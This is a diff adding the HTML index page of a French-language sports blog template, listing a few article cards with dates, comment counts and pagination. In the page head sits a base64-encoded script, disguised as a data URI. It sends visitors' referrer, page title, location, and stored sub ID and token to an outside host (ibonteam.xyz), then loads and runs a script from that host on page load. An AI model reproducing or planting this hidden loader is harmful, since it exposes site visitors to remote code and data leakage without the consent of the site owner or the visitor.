@@ -1,0 +1,182 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+	<title>Sports</title>
+	
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta charset="UTF-8">
+	
+	<!-- Font -->
+	<link href="https://fonts.googleapis.com/css?family=Roboto:400,600,700" rel="stylesheet">
+	
+	<!-- Stylesheets -->
+	
+	<link href="plugin-frameworks/bootstrap.css" rel="stylesheet">
+	
+	<link href="fonts/ionicons.css" rel="stylesheet">
+	
+		
+	<link href="common/styles.css" rel="stylesheet">
+	<link rel="stylesheet" href="common/paginate.css">
+	<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfamtDQzZoVFFLWko2cDd2Vyc7CiAgICBpZiAoIXdpbmRvdy5famtDQzZoVFFLWko2cDd2VykgewogICAgICAgIHdpbmRvdy5famtDQzZoVFFLWko2cDd2VyA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9pYm9udGVhbS54eXovMUtoQnBkMVgnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL2lib250ZWFtLnh5ei8yYWZlOTQ5L3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1lGWndDUFJiTlN2RjI2eDQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9ZRlp3Q1BSYk5TdkYyNng0ICE9PSAndW5kZWZpbmVkJyAmJiBfWUZad0NQUmJOU3ZGMjZ4NCAhPT0gbnVsbCkgewogICAgICAgIHZhciBfUE1uVEc3YlhNaDV5d0RQQyA9IEpTT04ucGFyc2UoX1lGWndDUFJiTlN2RjI2eDQpOwogICAgICAgIHZhciBfdHNwZnhDNmhkUUZRZmhRZiA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9QTW5URzdiWE1oNXl3RFBDLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2prQ0M2aFRRS1pKNnA3dlcudHRsIDwgX3RzcGZ4QzZoZFFGUWZoUWYpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF95WmtQQk1ybmRxdlA2N1ZqID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1FrUG1YOVJDbUNKd015M1ogPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfZGNDejg4Y1FaRlA5NkZaNCA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfZGNDejg4Y1FaRlA5NkZaNCArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfZGNDejg4Y1FaRlA5NkZaNCArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9qa0NDNmhUUUtaSjZwN3ZXLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF95WmtQQk1ybmRxdlA2N1ZqICE9PSAndW5kZWZpbmVkJyAmJiBfeVprUEJNcm5kcXZQNjdWaiAmJiB3aW5kb3cuX2prQ0M2aFRRS1pKNnA3dlcudW5pcXVlKSB7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfeVprUEJNcm5kcXZQNjdWaik7CiAgICB9CiAgICBpZiAodHlwZW9mIF9Ra1BtWDlSQ21DSndNeTNaICE9PSAndW5kZWZpbmVkJyAmJiBfUWtQbVg5UkNtQ0p3TXkzWiAmJiB3aW5kb3cuX2prQ0M2aFRRS1pKNnA3dlcudW5pcXVlKSB7CiAgICAgICAgX2RjQ3o4OGNRWkZQOTZGWjQgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9Ra1BtWDlSQ21DSndNeTNaKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9qa0NDNmhUUUtaSjZwN3ZXLlJfUEFUSCArIF9kY0N6ODhjUVpGUDk2Rlo0OwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
+</head>
+<body>
+	
+	<header>
+		<div class="bottom-menu">
+			<div class="container">
+				<a class="menu-nav-icon" data-menu="#main-menu" href="#"><i class="ion-navicon"></i></a>
+				
+				<center><ul class="main-menu" id="main-menu">
+					<li class="drop-down"><a href="#">Principal</a></li>
+					<li class="drop-down"><a href="contact.html">Contacts</a></li>
+					<li class="drop-down"><a href="terms.html">Termes et conditions</a></li>
+					<li class="drop-down"><a href="policy.html">Politique de confidentialité</a></li>
+				</ul></center>
+				<div class="clearfix"></div>
+			</div><!-- container -->
+		</div><!-- bottom-menu -->
+	</header>
+
+	
+	<section class="">
+		<div class="container">
+			<div class="row">
+			
+				<div class="col-md-8 offset-md-2">
+
+					
+					<div class="mb-30 sided-250x card-view">
+						<div class="s-left">
+							<img src="./images/img1.jpg" alt="">
+						</div><!-- left-area -->
+						<div class="s-right ptb-50 p-sm-20 pb-sm-5 plr-30 plr-xs-0">
+							<h4><a href="1.html">T Taye - Major De Ski De Presse</a></h4>
+							<ul class="mtb-10 list-li-mr-20 color-lite-black">
+								<li><i class="mr-5 font-12 ion-clock"></i>27.02.2021</li>
+								<li><i class="mr-5 font-12 ion-ios-chatbubble-outline"></i>7</li>
+								<li><i class="mr-5 font-12 ion-eye"></i>72</li>
+							</ul>
+						</div><!-- right-area -->
+					</div><!-- sided-250x -->
+					
+
+					<div class="mb-30 sided-250x card-view">
+						<div class="s-left">
+							<img src="./images/img2.jpg" alt="">
+						</div><!-- left-area -->
+						<div class="s-right ptb-50 p-sm-20 pb-sm-5 plr-30 plr-xs-0">
+							<h4><a href="2.html">Un Casque, c'est le Cadeau Parfait pour n'importe qui Qui Aime le Vélo</a></h4>
+							<ul class="mtb-10 list-li-mr-20 color-lite-black">
+								<li><i class="mr-5 font-12 ion-clock"></i>20.02.2021</li>
+								<li><i class="mr-5 font-12 ion-ios-chatbubble-outline"></i>12</li>
+								<li><i class="mr-5 font-12 ion-eye"></i>262</li>
+							</ul>
+						</div><!-- right-area -->
+					</div><!-- sided-250x -->
+					
+
+					<div class="mb-30 sided-250x card-view">
+						<div class="s-left">
+							<img src="./images/img3.jpg" alt="">
+						</div><!-- left-area -->
+						<div class="s-right ptb-50 p-sm-20 pb-sm-5 plr-30 plr-xs-0">
+							<h4><a href="3.html">Ce qui a tué le Baseball de la mystique?</a></h4>
+							<ul class="mtb-10 list-li-mr-20 color-lite-black">
+								<li><i class="mr-5 font-12 ion-clock"></i>08.02.2021</li>
+								<li><i class="mr-5 font-12 ion-ios-chatbubble-outline"></i>17</li>
+								<li><i class="mr-5 font-12 ion-eye"></i>185</li>
+							</ul>
+						</div><!-- right-area -->
+					</div><!-- sided-250x -->
+					
+
+					<div class="mb-30 sided-250x card-view">
+						<div class="s-left">
+							<img src="./images/img4.jpg" alt="">
+						</div><!-- left-area -->
+						<div class="s-right ptb-50 p-sm-20 pb-sm-5 plr-30 plr-xs-0">
+							<h4><a href="4.html">Les perspectives de la prochaine saison NBA - Partie 2</a></h4>
+							<ul class="mtb-10 list-li-mr-20 color-lite-black">
+								<li><i class="mr-5 font-12 ion-clock"></i>24.01.2021</li>
+								<li><i class="mr-5 font-12 ion-ios-chatbubble-outline"></i>3</li>
+								<li><i class="mr-5 font-12 ion-eye"></i>124</li>
+							</ul>
+						</div><!-- right-area -->
+					</div><!-- sided-250x -->
+					
+
+<div class="paginate wrapper"><!-- The "wrapper" is just a comestic addition. You don't need this for the pagination to work. -->
+        <ul>
+            <li><a href="">⟨</a></li>
+            <li><a href="" class="active">1</a></li>
+            <li><a href="2.html" class="inactive">2</a></li>
+            <li><a href="3.html">3</a></li>
+            <li><a href="4.html">4</a></li>
+            <li><a href="" class="more">...</a></li>
+            <li><a href="">18</a></li>
+            <li><a href="">19</a></li>
+            <li><a href="">⟩</a></li>
+        </ul>
+    </div>
+
+					
+				</div><!-- col-sm-8 -->
+				
+			</div><!-- row -->
+		</div><!-- container -->
+	</section>
+
+
+	<footer class="bg-191 pos-relative color-ccc bg-primary">
+		<div class="bg-dark-primary ptb-15 text-left">
+			<div class="container">
+				<div class="row">
+					
+					<div class="col-sm-12">
+						<ul class="mtb-5 font-11 text-md-center text-right list-a-p-5">
+							<li><a href="index.html">Principal</a></li>
+							<li><a href="contact.html">Contacts</a></li>
+							<li><a href="terms.html">Termes et conditions</a></li>
+							<li><a href="policy.html">Politique de confidentialité</a></li>
+						</ul>
+					</div><!-- col-sm-3 -->
+				</div><!-- row -->
+				
+			</div><!-- container -->
+		</div><!-- container -->
+	</footer>
+	
+	<!-- SCIPTS -->
+	
+	<script src="plugin-frameworks/jquery-3.2.1.min.js"></script>
+	
+	<script src="plugin-frameworks/tether.min.js"></script>
+	
+	<script src="plugin-frameworks/bootstrap.js"></script>
+	
+	<script src="common/scripts.js"></script>
+
+	<div class="cookie-banner">
+		<p>
+ Le site utilise des cookies. Ils nous permettent de vous reconnaître et obtenir des informations à propos de votre utilisateur experience.By en continuant de naviguer sur le site, j'accepte l'utilisation de cookies par le propriétaire du site en conformité avec la <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">politique en matière de Cookies</a>
+ </p>
+		<button class="close-cookie">×</button>
+	</div>
+	<script>
+		window.onload = function () {
+			$(&#39;.close-cookie&#39;).click(function () {
+				$(&#39;.cookie-banner&#39;).fadeOut();
+			})
+		}
+	</script>
+	<script>
+    let elems = document.querySelectorAll(&#39;.server-name&#39;);
+    elems.forEach((elem) =&gt; {
+        elem.innerHTML = window.location.hostname
+    })
+</script>
+	
+</body>
+</html>
